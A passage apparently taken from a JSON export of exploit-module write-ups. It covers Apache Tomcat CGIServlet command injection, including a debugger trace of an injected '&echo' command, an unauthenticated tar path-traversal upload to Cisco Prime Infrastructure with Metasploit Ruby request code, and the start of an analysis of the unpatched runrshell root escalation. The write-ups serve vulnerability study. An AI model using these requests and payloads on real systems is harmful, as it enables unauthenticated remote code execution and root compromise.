is creating a new instance of CGIEnvironment. The constructor of the class looks like this:\r\n\r\n```java\r\nprotected CGIEnvironment(HttpServletRequest req,\r\n                         ServletContext context) throws IOException {\r\n    setupFromContext(context);\r\n    setupFromRequest(req);\r\n\r\n    this.valid = setCGIEnvironment(req);\r\n\r\n    if (this.valid) {\r\n        workingDirectory = new File(command.substring(0,\r\n              command.lastIndexOf(File.separator)));\r\n    } else {\r\n        workingDirectory = null;\r\n    }\r\n}\r\n```\r\n\r\nWe see the first argument is an HttpServletRequest, which is extra interesting because since it's an HTTP request, it implies there are user-controlled inputs. There are two methods that need the HTTP request: setupFromRequest, and setCGIEnvironment. Let's take a look at the first:\r\n\r\n```java\r\nprotected void setupFromRequest(HttpServletRequest req)\r\n        throws UnsupportedEncodingException {\r\n\r\n    boolean isIncluded = false;\r\n\r\n    // Look to see if this request is an include\r\n    if (req.getAttribute(\r\n            RequestDispatcher.INCLUDE_REQUEST_URI) != null) {\r\n        isIncluded = true;\r\n    }\r\n    if (isIncluded) {\r\n        this.contextPath = (String) req.getAttribute(\r\n                RequestDispatcher.INCLUDE_CONTEXT_PATH);\r\n        this.servletPath = (String) req.getAttribute(\r\n                RequestDispatcher.INCLUDE_SERVLET_PATH);\r\n        this.pathInfo = (String) req.getAttribute(\r\n                RequestDispatcher.INCLUDE_PATH_INFO);\r\n    } else {\r\n        this.contextPath = req.getContextPath();\r\n        this.servletPath = req.getServletPath();\r\n        this.pathInfo = req.getPathInfo();\r\n    }\r\n    // If getPathInfo() returns null, must be using extension mapping\r\n    // In this case, pathInfo should be same as servletPath\r\n    if (this.pathInfo == null) {\r\n        this.pathInfo = this.servletPath;\r\n    }\r\n\r\n    // If the request method is GET, POST or HEAD and the query string\r\n    // does not contain an unencoded \"=\" this is an indexed query.\r\n    // The parsed query string becomes the command line parameters\r\n    // for the cgi command.\r\n    if (enableCmdLineArguments && (req.getMethod().equals(\"GET\")\r\n        || req.getMethod().equals(\"POST\") || req.getMethod().equals(\"HEAD\"))) {\r\n        String qs;\r\n        if (isIncluded) {\r\n            qs = (String) req.getAttribute(\r\n                    RequestDispatcher.INCLUDE_QUERY_STRING);\r\n        } else {\r\n            qs = req.getQueryString();\r\n        }\r\n        if (qs != null && qs.indexOf('=') == -1) {\r\n            StringTokenizer qsTokens = new StringTokenizer(qs, \"+\");\r\n            while ( qsTokens.hasMoreTokens() ) {\r\n                cmdLineParameters.add(URLDecoder.decode(qsTokens.nextToken(),\r\n                                      parameterEncoding));\r\n            }\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nThe first block of the code about \"include\" can be skipped because that's not what our request would be, so we want to focus on the second block:\r\n\r\n```java\r\nif (enableCmdLineArguments && (req.getMethod().equals(\"GET\")\r\n                               || req.getMethod().equals(\"POST\") || req.getMethod().equals(\"HEAD\"))) {\r\n  String qs;\r\n  if (isIncluded) {\r\n    qs = (String) req.getAttribute(\r\n      RequestDispatcher.INCLUDE_QUERY_STRING);\r\n  } else {\r\n    qs = req.getQueryString();\r\n  }\r\n  if (qs != null && qs.indexOf('=') == -1) {\r\n    StringTokenizer qsTokens = new StringTokenizer(qs, \"+\");\r\n    while ( qsTokens.hasMoreTokens() ) {\r\n      cmdLineParameters.add(URLDecoder.decode(qsTokens.nextToken(),\r\n                                              parameterEncoding));\r\n    }\r\n  }\r\n}\r\n```\r\n\r\nThe first thing that gets checked in the if condition is the enableCmdLineArguments variable, which is also mentioned in the advisory. By default, this option is set to false:\r\n\r\n```java\r\nprivate boolean enableCmdLineArguments = false;\r\n```\r\n\r\nIn the init function of CGIServlet, it is also clear for us that the setting needs to be configured in the config file in order to get loaded in the code:\r\n\r\n```java\r\nif (getServletConfig().getInitParameter(\"enableCmdLineArguments\") != null) {\r\n    enableCmdLineArguments =\r\n            Boolean.parseBoolean(config.getInitParameter(\"enableCmdLineArguments\"));\r\n}\r\n```\r\n\r\nAs the advisory and the code describe, when enableCmdLineArguments is enabled and the request is either GET, POST, or HEAD, we basically reach this part of the code:\r\n\r\n```java\r\nqs = req.getQueryString();\r\n```\r\n\r\nOnce the query string is loaded, that is normalized into command line parameters:\r\n\r\n```java\r\nif (qs != null && qs.indexOf('=') == -1) {\r\n  StringTokenizer qsTokens = new StringTokenizer(qs, \"+\");\r\n  while ( qsTokens.hasMoreTokens() ) {\r\n    cmdLineParameters.add(URLDecoder.decode(qsTokens.nextToken(),\r\n                                            parameterEncoding));\r\n  }\r\n}\r\n```\r\n\r\nBack to the doGet method, after the command line parameters are loaded. We are at this block of code:\r\n\r\n```java\r\nCGIRunner cgi = new CGIRunner(cgiEnv.getCommand(),\r\n                              cgiEnv.getEnvironment(),\r\n                              cgiEnv.getWorkingDirectory(),\r\n                              cgiEnv.getParameters());\r\n\r\nif (\"POST\".equals(req.getMethod())) {\r\n  cgi.setInput(req.getInputStream());\r\n}\r\ncgi.setResponse(res);\r\ncgi.run();\r\n```\r\n\r\nCGIRunner is a class that actually executes the CGI program, which occurs in the run method. The run method is really big, so it would be too much code to post but basically this is where code execution is gained:\r\n\r\n```java\r\nrt = Runtime.getRuntime();\r\nproc = rt.exec(\r\n  cmdAndArgs.toArray(new String[cmdAndArgs.size()]),\r\n  hashToStringArray(env), wd);\r\n```\r\n\r\nThe run method also handles the program output that is returned to the HTTP client, which is another bonus for the attacker.\r\n\r\n### Dynamic Analysis\r\n\r\nTo verify this execution flow, we can use IntelliJ to set up some breakpoints to observe. To do this, first add the following to the bin/startup.bat file (at around line 21):\r\n\r\n```bash\r\nset JAVA_OPTS=-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=4000,server=y,suspend=n\r\n```\r\n\r\nNext, start that file. There will be two important ports running: 4000 is the debugging port, and 8080 is the Tomcat server where the CGI program is served. Connect port 4000 with IntelliJ.\r\n\r\nThere are many possible methods we can add breakpoints for, but since we have seen that the Java's Runtime class is used to execute the CGI program, we can add a breakpoint right there:\r\n\r\n```\r\njava.lang.Runtime.exec\r\n```\r\n\r\nWhen we visit the CGI program, the breakpoint should trigger with the following backtrace:\r\n\r\n```\r\nexec:617, Runtime (java.lang)\r\nrun:1579, CGIServlet$CGIRunner (org.apache.catalina.servlets)\r\ndoGet:575, CGIServlet (org.apache.catalina.servlets)\r\nservice:538, CGIServlet (org.apache.catalina.servlets)\r\nservice:741, HttpServlet (javax.servlet.http)\r\ninternalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)\r\ndoFilter:166, ApplicationFilterChain (org.apache.catalina.core)\r\ndoFilter:53, WsFilter (org.apache.tomcat.websocket.server)\r\ninternalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)\r\ndoFilter:166, ApplicationFilterChain (org.apache.catalina.core)\r\ninvoke:200, StandardWrapperValve (org.apache.catalina.core)\r\ninvoke:96, StandardContextValve (org.apache.catalina.core)\r\ninvoke:490, AuthenticatorBase (org.apache.catalina.authenticator)\r\ninvoke:139, StandardHostValve (org.apache.catalina.core)\r\ninvoke:92, ErrorReportValve (org.apache.catalina.valves)\r\ninvoke:678, AbstractAccessLogValve (org.apache.catalina.valves)\r\ninvoke:74, StandardEngineValve (org.apache.catalina.core)\r\nservice:343, CoyoteAdapter (org.apache.catalina.connector)\r\nservice:408, Http11Processor (org.apache.coyote.http11)\r\nprocess:66, AbstractProcessorLight (org.apache.coyote)\r\nprocess:834, AbstractProtocol$ConnectionHandler (org.apache.coyote)\r\ndoRun:1415, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)\r\nrun:49, SocketProcessorBase (org.apache.tomcat.util.net)\r\nrunWorker:1149, ThreadPoolExecutor (java.util.concurrent)\r\nrun:624, ThreadPoolExecutor$Worker (java.util.concurrent)\r\nrun:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)\r\nrun:748, Thread (java.lang)\r\n```\r\n\r\nFor the extra file, we can also attach WinDBG to java.exe. You may have multiple java.exe for whatever reason, just make sure you're attaching the one that listens on port 8080. In WinDBG, add this breakpoint:\r\n\r\n```\r\nbu KERNELBASE!CreateProcessW\r\n```\r\n\r\nAgain, when you visit the CGI program, you should see that Java is using CreateProcessW to launch the CGI program:\r\n\r\n```\r\n0:021> r\r\nrax=0000000000000001 rbx=0000000008000400 rcx=0000000000000000\r\nrdx=0000000017bbdd80 rsi=0000000017f869f8 rdi=ffffffffffffff00\r\nrip=00007ffd8d423dd0 rsp=0000000019d7dee8 rbp=0000000019d7e050\r\n r8=0000000000000000  r9=0000000000000000 r10=0000000000000000\r\nr11=0000000019d7df48 r12=0000000000000000 r13=0000000000000064\r\nr14=00000000176d8980 r15=0000000000000060\r\niopl=0         nv up ei pl nz na po nc\r\ncs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206\r\nKERNELBASE!CreateProcessW:\r\n00007ffd`8d423dd0 4c8bdc          mov     r11,rsp\r\n0:021> du rdx\r\n00000000`17bbdd80  \"C:\\Users\\sinn3r\\Desktop\\apache-t\"\r\n00000000`17bbddc0  \"omcat-9.0.17\\webapps\\ROOT\\WEB-IN\"\r\n00000000`17bbde00  \"F\\cgi\\test.bat &echo CQdjFeaVZh\"\r\n```\r\n\r\nIt looks we are calling test.bat (the CGI program) with an arbitrary echo command. At this point, we have proven the exploitability of the vulnerability.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "62a14cc1-82ec-4b71-908b-9520a249c5fd",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "bfc08c3d-ed2c-462a-9081-2e5df6fb6415",
      "created": "2019-09-12T18:06:52.838424Z",
      "revisionDate": "2020-02-13T17:12:23.787668Z",
      "document": "## Description\r\n\r\nCisco Prime Infrastructure (CPI) is a wired and wireless network management software suite that consists of different networking applications from Cisco Systems. The system is used across various industries, from healthcare, manufacturing, government, IT, etc.\r\n\r\nA vulnerability was found in the HealthMonitor component, specifically the TarArchive class that is used to extract a Tar file. An unauthenticated user can upload a Tar file that embeds a malicious JSP payload, with a path that traverses back to the web directory. After extraction, the user can send a GET request to trigger the JSP payload, and gain arbitrary remote code execution.\r\n\r\nIt was originally discovered by Steven Seeley (mr_me) of Source Incite. A detailed write-up is also available [here](https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html).\r\n\r\n## Vulnerable Setup\r\n\r\nTo trigger this vulnerability, you will need a primary and a secondary server (from the same ISO). Both images require the same hardware setup:\r\n\r\n* 4 CPU cores.\r\n* 12288 MB of RAM (12 GB).\r\n* 350GB of space.\r\n* Both VMs should be on the same network.\r\n\r\nMake sure the primary server is installed first. To actually recreate the specific vulnerable environment the exploit needs, you will need to install the PI_3_4_1-1.0.27.ubf patch (56a2acbcf31ad7c238241f701897fcb1). Also, create an authentication key, which is completely arbitrary, just like a password. And finally, check with iptables and make sure port 80 isn't blocked if that's the case:\r\n\r\nThe next VM is the secondary server. The installation is almost the same way, except that you just need to remember to choose you're installing it as a secondary. The setup wizard will ask you the authentication key, and the rest is easy.\r\n\r\nFor the final step, go to the primary server's administration page, and establish the HA connection to the secondary server.\r\n\r\n## Vulnerability Details\r\n\r\nOur vulnerability started off with a public report from Source Incite ([SRC-2019-0034](https://srcincite.io/advisories/src-2019-0034/)), which provides the important details about the issue:\r\n\r\n> The specific flaw exists within the TarArchive class. The issue results from the lack of proper validation of a user-supplied path prior to using it in file operations. A (remote) attacker can leverage this vulnerability to execute code under the context of root.\r\n\r\nAfter obtaining the vulnerable software and setting it up (thanks to Steven), and SSH into the machine, we start looking for our first clue: the **TarArchive** class.\r\n\r\nAfter browsing around the file system, it looks like most of the CPI code can be found in the `/opt/CSCOlumos/` directory. That is where we want to begin.\r\n\r\n### Starting Point: Tar Extraction\r\n\r\nAt first glance, it isn't very clear how or where the TarArchive class is used, so our first attempt is do a grep for TarArchive, and these results come up:\r\n\r\n```\r\n$ grep -R TarArchive *\r\nBinary file compliance/lib/commons-compress-1.8.jar matches\r\nBinary file compliance/lib/IAClasses.zip matches\r\nBinary file lib/pf_third_party/com.cisco.xmp.osgi.tar-2.5.jar matches\r\nBinary file lib/xmp-third-party/xdi-2.0.0.jar matches\r\nBinary file lib/ifm_third_party/commons-compress-1.9.jar matches\r\nBinary file staging/pf/com.cisco.xmp.osgi.tar-2.5.jar matches\r\nBinary file staging/ifm/commons-compress-1.9.jar matches\r\nBinary file staging/ifm/compliance-11-zip.zip matches\r\n```\r\n\r\nBy going through a few of these with some guesses using a Java decompiler, we found the actual file that contains TarArchive.class:\r\n\r\n```\r\n/opt/CSCOlumos/lib/pf_third_party/com.cisco.xmp.osgi.tar-2.5.jar\r\n```\r\n\r\nAs the path implies, TarArchive is really just a third party library, so we also need to learn which Cisco component is using it. This isn't difficult to figure out. In java, in order to use a library, you must import it first. Back in the jar file, we know that the TarArchive class is in the `com.ice.tar` package, so again, let's grep for that:\r\n\r\n```\r\n$ grep -iR \"ice.tar\" *\r\nBinary file pf/rfm-3.4.0.0.348.jar matches\r\nBinary file pf_third_party/com.cisco.xmp.osgi.tar-2.5.jar matches\r\nBinary file xmp-third-party/xdi-2.0.0.jar matches\r\n```\r\n\r\nGoing through these files, the **rfm-3.4.0.0.348.jar** seems to be an ideal choice, because there is another class called FileArchiver, which uses the TarArchive.\r\n\r\nThe FileArchiver class has a method called **extractArchive**, this definitely stands out because our vulnerability is about unsafely extracting a Tar. This isn't a big method, and it doesn't take too long to realize that there are only two important lines of code:\r\n\r\n```java\r\nif (destDir != null) {\r\n  try {\r\n    setupReadArchive(istream);\r\n    this.archive.extractContents(destDir);\r\n    result = true;\r\n  }\r\n  ...\r\n```\r\n\r\nSo let's take a look at setupReadArchive first. It looks like the most important purpose of this method is really to load our Tar file as an InputStream, and load it with TarArchive in `this.archive`:\r\n\r\n```java\r\nprivate boolean setupReadArchive(InputStream istream) throws IOException {\r\n  if (this.archiveName != null && istream == null) {\r\n    try {\r\n      this.inStream = new FileInputStream(this.archiveName);\r\n    }\r\n    catch (IOException ex) {\r\n\r\n      this.inStream = null;\r\n      return false;\r\n    } \r\n  } else {\r\n\r\n    this.inStream = istream;\r\n  }  if (this.inStream != null) {\r\n    if (this.compressed) {\r\n      try {\r\n        this.inStream = new GZIPInputStream(this.inStream);\r\n      }\r\n      catch (IOException ex) {\r\n\r\n        this.inStream = null;\r\n      } \r\n\r\n      if (this.inStream != null) {\r\n        this.archive = new TarArchive(this.inStream, '\ufffd\ufffd\ufffd');\r\n      }\r\n    } else {\r\n      this.archive = new TarArchive(this.inStream, '\ufffd\ufffd\ufffd');\r\n    } \r\n  }\r\n  ...\r\n```\r\n\r\nThe next task is calling TarArchive's extractContents method, which is really more like a wrapper for the extractEntry method, so we look at that instead:\r\n\r\n```java\r\nprivate void extractEntry(File paramFile, TarEntry paramTarEntry) throws IOException { if (this.verbose && this.progressDisplay != null)\r\n    this.progressDisplay.showTarProgressMessage(paramTarEntry.getName()); \r\n  String str = paramTarEntry.getName();\r\n  str = str.replace('/', File.separatorChar);\r\n  File file = new File(paramFile, str);\r\n  if (paramTarEntry.isDirectory()) {\r\n    if (!file.exists() && !file.mkdirs())\r\n      throw new IOException(\"error making directory path '\" + file.getPath() + \"'\"); \r\n  } else {\r\n    File file1 = new File(file.getParent());\r\n    if (!file1.exists() && !file1.mkdirs())\r\n      throw new IOException(\"error making directory path '\" + file1.getPath() + \"'\"); \r\n    if (this.keepOldFiles && file.exists()) {\r\n      if (this.verbose && this.progressDisplay != null)\r\n        this.progressDisplay.showTarProgressMessage(\"not overwriting \" + paramTarEntry.getName()); \r\n    } else {\r\n      boolean bool = false;\r\n      FileOutputStream fileOutputStream = new FileOutputStream(file);\r\n      if (this.asciiTranslate) {\r\n        MimeType mimeType = null;\r\n        String str1 = null;\r\n        try {\r\n          str1 = FileTypeMap.getDefaultFileTypeMap().getContentType(file);\r\n          mimeType = new MimeType(str1);\r\n          if (mimeType.getPrimaryType().equalsIgnoreCase(\"text\")) {\r\n            bool = true;\r\n          } else if (this.transTyper != null && this.transTyper.isAsciiFile(paramTarEntry.getName())) {\r\n            bool = true;\r\n          } \r\n        } catch (MimeTypeParseException mimeTypeParseException) {}\r\n        if (this.debug)\r\n          System.err.println(\"EXTRACT TRANS? '\" + bool + \"'  ContentType='\" + str1 + \"'  PrimaryType='\" + mimeType.getPrimaryType() + \"'\"); \r\n      } \r\n      PrintWriter printWriter = null;\r\n      if (bool)\r\n        printWriter = new PrintWriter(fileOutputStream); \r\n      byte[] arrayOfByte = new byte[32768];\r\n      while (true) {\r\n        int i = this.tarIn.read(arrayOfByte);\r\n        if (i == -1)\r\n          break; \r\n        if (bool) {\r\n          byte b1 = 0;\r\n          for (byte b2 = 0; b2 < i; b2++) {\r\n            if (arrayOfByte[b2] == 10) {\r\n              String str1 = new String(arrayOfByte, b1, b2 - b1);\r\n              printWriter.println(str1);\r\n              b1 = b2 + 1;\r\n            } \r\n          } \r\n          continue;\r\n        } \r\n        fileOutputStream.write(arrayOfByte, 0, i);\r\n      } \r\n      if (bool) {\r\n        printWriter.close();\r\n      } else {\r\n        fileOutputStream.close();\r\n      } \r\n    } \r\n  }  }\r\n```\r\n\r\nThe code is a bit thick, but there are some important lines to point out. In the beginning, the first argument of the method is actually the destination directory, which is passed to create a new File object, along with a name extracted from the Tar entry:\r\n\r\n```java\r\nString str = paramTarEntry.getName();\r\nstr = str.replace('/', File.separatorChar);\r\nFile file = new File(paramFile, str);\r\n```\r\n\r\nPhysically, a Tar archive may have multiple entries, each describing a file. So the first line above pretty much says: \"give me the name of this entry\". Since this goes to the File object, it is actually where the directory traversal bug is, because that name isn't checked.\r\n\r\nThe File object then is passed to FileOutputStream, all the way to writing it, and closing the handle:\r\n\r\n```java\r\nFileOutputStream fileOutputStream = new FileOutputStream(file);\r\n...\r\nPrintWriter printWriter = null;\r\nif (bool)\r\n  printWriter = new PrintWriter(fileOutputStream); \r\nbyte[] arrayOfByte = new byte[32768];\r\nwhile (true) {\r\n  int i = this.tarIn.read(arrayOfByte);\r\n  if (i == -1)\r\n    break; \r\n  if (bool) {\r\n    byte b1 = 0;\r\n    for (byte b2 = 0; b2 < i; b2++) {\r\n      if (arrayOfByte[b2] == 10) {\r\n        String str1 = new String(arrayOfByte, b1, b2 - b1);\r\n        printWriter.println(str1);\r\n        b1 = b2 + 1;\r\n      } \r\n    } \r\n    continue;\r\n  } \r\n  fileOutputStream.write(arrayOfByte, 0, i);\r\n}\r\n...\r\n```\r\n\r\nAt this point, we have proof that TarArchive's extraction feature is unsafe, the next thing we want to find out is how to actually trigger it remotely.\r\n\r\n### Attacker's Entry Point: UploadServlet Class\r\n\r\nWe know that there is a wrapper class called FileArchive that is using TarArchive. The question to ask is: what is using FileArchive? Well, since the FileArchive class has this unique method named **extractArchive**, the educated guess here is that if there's any code using it, they would be calling extractArchive.\r\n\r\nSearching around that particular string in the decompiler, four results show up:\r\n\r\n* FileArchiver.class\r\n* FileConsumer.class\r\n* FileExtractor.class\r\n* UploadServlet.class\r\n\r\nThe first candidate obviously can be eliminated because that's where the method comes from. If you're at this point, it is REALLY difficult not to click on the UploadServlet, because anything that says \"upload\" in a web application is potentially a vulnerability.\r\n\r\nLooking at the UploadServlet class, we immediately identity the code that is using the `extractArchive` method:\r\n\r\n```java\r\nprivate boolean processFileUploadStream(FileItemStream item, InputStream istream, String destDir, String archiveOrigin, boolean archiveIsCompressed, String archiveName, long sizeInBytes, String outputDir) throws IOException {\r\n  boolean result = false;\r\n  \r\n  try {\r\n    FileExtractor extractor = new FileExtractor();\r\n    AesLogImpl.getInstance().info(128, new Object[] { \"processFileUploadStream: Start extracting archive = \" + archiveName + \" size= \" + sizeInBytes });\r\n    \r\n    extractor.setDebug(this.debugTar);\r\n    \r\n    result = extractor.extractArchive(istream, destDir, archiveOrigin, archiveIsCompressed);\r\n    ...\r\n```\r\n\r\nThe processFileUploadStream method is private, and called from a doPost method:\r\n\r\n```java\r\npublic void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\r\n  boolean archiveIsCompressed;\r\n  String fileName = null;\r\n  \r\n  long fileSize = 0L;\r\n  \r\n  result = false;\r\n  response.setContentType(\"text/html\");\r\n  String destDir = request.getHeader(\"Destination-Dir\");\r\n  archiveOrigin = request.getHeader(\"Primary-IP\");\r\n  String fileCount = request.getHeader(\"Filecount\");\r\n  fileName = request.getHeader(\"Filename\");\r\n  String sz = request.getHeader(\"Filesize\");\r\n  if (sz != null)\r\n    fileSize = Long.parseLong(sz); \r\n  String compressed = request.getHeader(\"Compressed-Archive\");\r\n  if (compressed.equals(\"true\")) {\r\n    archiveIsCompressed = true;\r\n  } else {\r\n    archiveIsCompressed = false;\r\n  } \r\n  AesLogImpl.getInstance().info(128, new Object[] { \"Received archive=\" + fileName, \" size=\" + fileSize + \" from \" + archiveOrigin + \" containing \" + fileCount + \" files to be extracted to: \" + destDir });\r\n\r\n\r\n\r\n  \r\n  ServletFileUpload upload = new ServletFileUpload();\r\n  \r\n  upload.setSizeMax(-1L);\r\n  PropertyManager pmanager = PropertyManager.getInstance(archiveOrigin);\r\n  String outDir = pmanager.getOutputDirectory();\r\n  \r\n  File fOutdir = new File(outDir);\r\n  if (!fOutdir.exists()) {\r\n    AesLogImpl.getInstance().info(128, new Object[] { \"UploadServlet: Output directory for archives \" + outDir + \" does not exist. Continuing...\" });\r\n  }\r\n\r\n\r\n  \r\n  String debugset = pmanager.getProperty(\"DEBUG\");\r\n  if (debugset != null && debugset.equals(\"true\")) {\r\n    this.debugTar = true;\r\n    AesLogImpl.getInstance().info(128, new Object[] { \"UploadServlet: Debug setting is specified\" });\r\n  } \r\n\r\n\r\n  \r\n  try {\r\n    FileItemIterator iter = upload.getItemIterator(request);\r\n    while (iter.hasNext()) {\r\n      FileItemStream item = iter.next();\r\n      String name = item.getFieldName();\r\n      InputStream stream = item.openStream();\r\n      if (item.isFormField()) {\r\n        AesLogImpl.getInstance().error(128, new Object[] { \"Form field input stream with name \" + name + \" detected. Abort processing\" });\r\n        \r\n        response.sendError(500, \"Servlet does not handle FormField uploads.\");\r\n        \r\n        return;\r\n      } \r\n      \r\n      result = processFileUploadStream(item, stream, destDir, archiveOrigin, archiveIsCompressed, fileName, fileSize, outDir);\r\n\r\n      \r\n      stream.close();\r\n    }\r\n  \r\n  } catch (Exception e) {\r\n    AesLogImpl.getInstance().error(128, new Object[] { \"doPost - Caught an Exception while handling fileUpload \" + e });\r\n  \r\n  }\r\n  catch (OutOfMemoryError e) {\r\n    AesLogImpl.getInstance().error(128, new Object[] { \"doPost - Caught an OutOfMemoryError while handling fileUpload \" });\r\n  \r\n  }\r\n  catch (Throwable e) {\r\n    AesLogImpl.getInstance().error(128, new Object[] { \"doPost - Caught a Throwable while handling fileUpload \" + e });\r\n  }\r\n  finally {\r\n    \r\n    if (result) {\r\n      response.setStatus(200);\r\n    } else {\r\n      \r\n      response.sendError(500, \"Could not extract archive file from source \" + archiveOrigin);\r\n      \r\n      AesLogImpl.getInstance().error1(128, \"doPost - could not extract file from source \");\r\n    } \r\n  } \r\n}\r\n```\r\n\r\nFor an HTTP client such as Metasploit's HttpClient mixin, we can send a POST request like this to satisfy the conditions needed for the `doPost` method:\r\n\r\n```ruby\r\npost_data = Rex::MIME::Message.new\r\npost_data.add_part(tar.data, nil, nil, \"form-data; name=\\\"files\\\"; filename=\\\"#{tar.tar_name}\\\"\")\r\n\r\nres = send_request_cgi({\r\n  'method' => 'POST',\r\n  'uri'    => normalize_uri(target_uri.path, 'servlet', 'UploadServlet'),\r\n  'data'   => post_data.to_s,\r\n  'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\r\n  'headers' =>\r\n    {\r\n      'Destination-Dir' => 'tftpRoot',\r\n      'Compressed-Archive' => 'false',\r\n      'Primary-IP' => '127.0.0.1',\r\n      'Filecount' => '1',\r\n      'Filename' => tar.tar_name,\r\n      'FileSize' => tar.length\r\n    }\r\n})\r\n```\r\n\r\nAt this point, it is clear to us that we can send a malicious Tar file via a POST request to the UploadServlet (without any authentication), and then that will get extracted by the TarArchive library, allowing us to save the payload outside the intended directory, and gain remote code execution.\r\n\r\n### Root Access?\r\n\r\nIt is worth pointing out that in the public advisory and proof-of-concept, the vulnerability is described to give you remote code execution as root. In reality, you actually only get a lower web privilege for exploiting the TarArchive vulnerability. However, in the /opt/CSCOlumos/bin folder, there is an executable called **runrshell** that actually can be abused to give you root privilege access, and as of now isn't patched by Cisco. This means that as long as you are able to gain remote code execution on Cisco Prime Infrastructure, you should always be get root access by taking advantage of runrshell.\r\n\r\n## Credit\r\n\r\nSpecial thanks to Steven Seeley for providing setup, vulnerability information, and other resources in order to produce the Metasploit module.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "ffaa61a2-74a5-44e2-bbba-016567d07a93",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "6bc3836a-380f-4a7a-8e2a-0d2846c8e587",
      "created": "2019-09-12T18:06:53.86571Z",
      "revisionDate": "2020-02-13T17:12:23.43302Z",
      "document": "## Background\r\n\r\nCisco Prime Infrastructure (CPI) is a wired and wireless network management software suite that consists of different networking applications from Cisco Systems. The system is used across various industries, from healthcare, manufacturing, government, IT, etc.\r\n\r\nA vulnerability was found in the runrshell binary, which would allow a local user to gain control under the context of root. It is also chained by other publicly known CPI remote exploits to get root in one shot, such as CVE-2018-15379 by Pedro Ribeiro, and CVE-2019-1821 by Steven Seeley.\r\n\r\nAs of now, there appears to be no patch from Cisco. \r\n\r\n## System Setup\r\n\r\nAll versions of Cisco Prime Infrastructure should be affected by this. In order to set up a machine for testing purposes, you want to at least prepare the following:\r\n\r\n* 4 CPU cores.\r\n* 12288 MB of RAM (12 GB)\r\n* 350 GB of space.\r\n\r\n## Technical Details\r\n\r\nThe runrshell binary in Cisco Prime Infrastructure is rather a small C program, which looks like this in IDA:\r\n\r\n```assembly\r\n.text:0000000000400634 ; int __cdecl main(int argc, const char **argv, const char **envp)\r\n.text:0000000000400634                 public main\r\n.text:0000000000400634 main            proc near               ; DATA XREF: _start+1D\u2191o\r\n.text:0000000000400634\r\n.text:0000000000400634 var_820         = qword ptr -820h\r\n.text:0000000000400634 var_814         = dword ptr -814h\r\n.text:0000000000400634 dest            = byte ptr -810h\r\n.text:0000000000400634 var_10          = dword ptr -10h\r\n.text:0000000000400634 var_4           = dword ptr -4\r\n.text:0000000000400634\r\n.text:0000000000400634                 push    rbp\r\n.text:0000000000400635                 mov     rbp, rsp\r\n.text:0000000000400638                 sub     rsp, 820h\r\n.text:000000000040063F                 mov     [rbp+var_814], edi\r\n.text:0000000000400645                 mov     [rbp+var_820], rsi\r\n.text:000000000040064C                 mov     edi, 0          ; uid\r\n.text:0000000000400651                 call    _setuid\r\n.text:0000000000400656                 mov     edi, 0          ; gid\r\n.text:000000000040065B                 call    _setgid\r\n.text:0000000000400660                 mov     edx, 1          ; replace\r\n.text:0000000000400665                 mov     esi, offset value ; \"/opt/CSCOlumos/rcmds\"\r\n.text:000000000040066A                 mov     edi, offset name ; \"PATH\"\r\n.text:000000000040066F                 call    _setenv\r\n.text:0000000000400674                 mov     ecx, offset aBinBashRC ; \"/bin/bash -r -c \\\"\"\r\n.text:0000000000400679                 lea     rax, [rbp+dest]\r\n.text:0000000000400680                 mov     edx, 12h        ; n\r\n.text:0000000000400685                 mov     rsi, rcx        ; src\r\n.text:0000000000400688                 mov     rdi, rax        ; dest\r\n.text:000000000040068B                 call    _memcpy\r\n.text:0000000000400690                 mov     [rbp+var_4], 0\r\n.text:0000000000400697                 mov     [rbp+var_4], 1\r\n.text:000000000040069E                 jmp     short loc_4006E3\r\n.text:00000000004006A0 ; ---------------------------------------------------------------------------\r\n.text:00000000004006A0\r\n.text:00000000004006A0 loc_4006A0:                             ; CODE XREF: main+BB\u2193j\r\n.text:00000000004006A0                 mov     eax, [rbp+var_4]\r\n.text:00000000004006A3                 cdqe\r\n.text:00000000004006A5                 shl     rax, 3\r\n.text:00000000004006A9                 add     rax, [rbp+var_820]\r\n.text:00000000004006B0                 mov     rax, [rax]\r\n.text:00000000004006B3                 mov     rdx, rax\r\n.text:00000000004006B6                 lea     rax, [rbp+dest]\r\n.text:00000000004006BD                 mov     rsi, rdx        ; src\r\n.text:00000000004006C0                 mov     rdi, rax        ; dest\r\n.text:00000000004006C3                 call    _strcat\r\n.text:00000000004006C8                 mov     edx, offset src ; \" \"\r\n.text:00000000004006CD                 lea     rax, [rbp+dest]\r\n.text:00000000004006D4                 mov     rsi, rdx        ; src\r\n.text:00000000004006D7                 mov     rdi, rax        ; dest\r\n.text:00000000004006DA                 call    _strcat\r\n.text:00000000004006DF                 add     [rbp+var_4], 1\r\n.text:00000000004006E3\r\n.text:00000000004006E3 loc_4006E3:                             ; CODE XREF: main+6A\u2191j\r\n.text:00000000004006E3                 mov     eax, [rbp+var_814]\r\n.text:00000000004006E9                 sub     eax, 1\r\n.text:00000000004006EC                 cmp     eax, [rbp+var_4]\r\n.text:00000000004006EF                 jge     short loc_4006A0\r\n.text:00000000004006F1                 mov     edx, offset asc_400856 ; \"\\\"\"\r\n.text:00000000004006F6                 lea     rax, [rbp+dest]\r\n.text:00000000004006FD                 mov     rsi, rdx        ; src\r\n.text:0000000000400700                 mov     rdi, rax        ; dest\r\n.text:0000000000400703                 call    _strcat\r\n.text:0000000000400708                 lea     rax, [rbp+dest]\r\n.text:000000000040070F                 mov     rdi, rax        ; command\r\n.text:0000000000400712                 call    _system\r\n.text:0000000000400717                 mov     [rbp+var_10], 0\r\n.text:000000000040071E                 mov     [rbp+var_10], eax\r\n.text:0000000000400721                 mov     eax, [rbp+var_10]\r\n.text:0000000000400724                 and     eax, 0FF00h\r\n.text:0000000000400729                 sar     eax, 